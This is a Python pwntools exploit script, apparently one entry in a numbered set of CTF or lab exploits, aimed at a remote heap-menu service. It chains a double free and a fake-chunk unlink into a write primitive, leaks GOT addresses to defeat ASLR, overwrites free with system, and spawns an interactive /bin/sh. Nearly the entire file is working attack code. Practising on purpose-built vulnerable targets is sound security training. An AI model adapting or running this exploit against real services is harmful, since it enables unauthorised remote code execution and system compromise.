#! /usr/bin/python
#coding:utf-8
'''Heap_DoubleFree - Ret2libc (ALSR - on)'''

import socket
import struct
import sys
sys.path.append("..")
import payloads
from payloads import *
from pwn import *

class exploit(object):
    'exploit6'
    def __init__(self, options):
        self.options = options
        self.info = {
            'libc_free':0x0007a260,
            'libc_sys':0x0003f430,
            '&ptr':0x0804bfa0,
            'got':0x0804a004
            }
    def test(self):
        ip, port = self.options['dIP'], int(self.options['dPort'])
        p = remote(ip, port)


        p.recvline() # choice
        p.sendline('m')
        p.recvline() # malloc
        p.recvline() # size
        p.sendline('504')
        p.recvline() # content
        p.sendline('aaa')
        p.recvline() # ok

        p.recvline() # choice
        p.sendline('m')
        p.recvline() # malloc
        p.recvline() # size
        p.sendline('512')
        p.recvline() # content
        p.sendline('aaa')
        p.recvline() # ok

        p.recvline() # choice
        p.sendline('f')
        p.recvline() # free
        p.sendline('0')
        p.recvline() # ok

        p.recvline() # choice
        p.sendline('f')
        p.recvline() # free
        p.sendline('1')
        p.recvline() # ok

        #关键payload
        p.recvline() # choice
        p.sendline('m')
        p.recvline() # malloc
        p.recvline() # size
        p.sendline('768')
        p.recvline() # content
        p.sendline(p32(0x0)  + p32(0x1f9) + p32(self.info['&ptr'] - 0xc) + p32(self.info['&ptr'] - 0x8) + 'a'*(0x200-24) + p32(0x1f8) + p32(0x108))
        p.recvline() # ok


        p.recvline() # choice
        p.sendline('m')
        p.recvline() # malloc
        p.recvline() # size
        p.sendline('20')
        p.recvline() # content
        p.sendline('/bin/sh')
        p.recvline() # ok

        p.recvline() # choice
        p.sendline('f')
        p.recvline() # free
        p.sendline('1')
        p.recvline() # ok


        p.recvline() # choice
        p.sendline('e')
        p.recvline() # edit
        p.sendline('0')
        p.sendline('a'*12 + p32(self.info['got']))
        p.recvline() # ok

    # leak GOT
        p.recvline() # choice
        p.sendline('p')
        p.recvline() # print
        p.sendline('0')

        gets = u32(p.recv(4))
        free_addr = u32(p.recv(4))
        getchar = u32(p.recv(4))
        malloc = u32(p.recv(4))
        puts = u32(p.recv(4))
        gmon_start__  = u32(p.recv(4))
        libc_start_main = u32(p.recv(4))
        isoc99_scanf = u32(p.recv(4))


        # p.recvline() # end
        # p.recvline()

        sys_addr = free_addr - self.info['libc_free'] + self.info['libc_sys']

        print '\t\tfree_addr = ' + hex(free_addr)
        print '\t\tsystem_addr = ' + hex(sys_addr)

        p.recvline() # choice
        p.sendline('e')
        p.recvline() # edit
        p.sendline('0')
    # overwrite GOT
        p.sendline(p32(gets) + p32(sys_addr) + p32(getchar) + p32(malloc) + p32(puts) + p32(gmon_start__) + p32(libc_start_main) + p32(isoc99_scanf))
        p.recvline() # ok

        p.recvline() # choice
        p.sendline('f')
        p.recvline() # free
        p.sendline('3')

        p.recvline()
        p.recvline()

        print "\tfree(a[2003]) ===> system('/bin/sh')"
        p.interactive()





if __name__=='__main__':
    pass



